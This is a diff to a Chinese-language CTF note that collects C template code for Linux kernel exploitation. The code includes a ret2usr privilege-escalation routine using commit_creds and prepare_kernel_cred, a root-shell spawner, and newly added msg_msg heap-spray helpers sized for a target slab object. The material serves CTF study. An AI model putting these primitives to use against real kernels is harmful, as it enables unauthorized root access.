@@ -25,8 +25,9 @@ PS:更新与`2026-07-26`<br>
 以目前浅薄的kernel pwn经验，总结了一套kernel pwn时会用到的基本操作，不定时更新~<br>
 ```c
 // gcc -fcf-protection=none -masm=intel -static xxx.c -o xxx
+
+#define _GNU_SOURCE
 #include <sys/types.h>
-#include <sys/wait.h> // waitpid
 #include <stdio.h>
 #include <linux/userfaultfd.h>
 #include <pthread.h>
@@ -35,6 +36,7 @@ PS:更新与`2026-07-26`<br>
 #include <stdlib.h>
 #include <fcntl.h> // define open, O_RDONLY, O_WRONLY, O_CREAT 
 #include <signal.h>
+#include <sys/wait.h> // waitpid
 #include <poll.h>
 #include <string.h>
 #include <sys/mman.h>
@@ -43,6 +45,11 @@ PS:更新与`2026-07-26`<br>
 #include <sys/sem.h>
 #include <semaphore.h>
 #include <poll.h>
+#include <sys/ipc.h>
+#include <sys/msg.h> // msg_msg 
+#include <sched.h> 
+#include <stdint.h>
+
 
 size_t commit_creds=0;
 size_t prepare_kernel_cred =0;
@@ -72,7 +79,7 @@ void get_root_shell(void){
     system("/bin/sh");
 }
 
-//ret2usr
+// ret2usr
 void get_root_privilege(){
     //printf("use ret2usr\n"); //don't use user func in kernel space!
     void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
@@ -114,6 +121,69 @@ void get_flag(void){
     puts("[*] Hopefully flag is readable");
     system("cat /tmp/flag");
     exit(0);
+}
+
+
+// msg_msg 
+// make sure the process run in one fixed cpu
+static void pin_to_current_cpu(void)
+{
+    cpu_set_t set;
+    int cpu = sched_getcpu();
+
+    if (cpu < 0) {
+        fprintf(stderr, "[-] sched_getcpu failed: %s\n", strerror(errno));
+        return;
+    }
+
+    CPU_ZERO(&set);
+    CPU_SET(cpu, &set);
+    if (sched_setaffinity(0, sizeof(set), &set) < 0)
+        fprintf(stderr, "[-] sched_setaffinity failed: %s\n", strerror(errno));
+    else
+        fprintf(stderr, "[+] pinned to CPU %d\n", cpu);
+}
+
+static void fatal(const char *what)
+{
+    perror(what);
+    exit(EXIT_FAILURE);
+}
+
+#define TARGET_OBJECT_SIZE  0x1d0UL          /* need to change according to the situation*/
+#define MSG_HEADER_SIZE    0x30UL
+#define MSGSEG_HEADER_SIZE 0x08UL
+#define DATAMSG_LEN        (0x1000UL - MSG_HEADER_SIZE)       /* 0xfd0 */
+#define DATAMSGSEG_LEN     (TARGET_OBJECT_SIZE - MSGSEG_HEADER_SIZE)
+#define MESSAGE_SIZE        (DATAMSG_LEN + DATAMSGSEG_LEN)       /* target msg size */
+
+struct message {
+    long type;
+    unsigned char text[MESSAGE_SIZE];
+};
+
+int msg_create_queue(){
+    // int key = ftok(".",0); // create a new key and can be found by other process
+    // int msg_id = msgget(key,0666| IPC_CREAT);
+    int msg_id = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
+    if (msg_id < 0)
+        fatal("msgget");
+    fprintf(stderr, "[+] created SysV message queue %d\n", msg_id);
+    return msg_id;
+}
+
+void msg_send(int msg_id, void *msg_addr,int msg_size, int flag){
+    int mark = msgsnd(msg_id,msg_addr,msg_size,flag);
+    if (mark <0){
+        fatal("msg send");
+    }
+}
+
+void msg_recv(int msg_id, void *msg_addr,int msg_size,int msg_type, int flag){
+    int received = msgrcv(msg_id, msg_addr, msg_size, msg_type, flag);
+    if (received < 0){
+        fatal("msgrcv");
+    }
 }
 ```
 
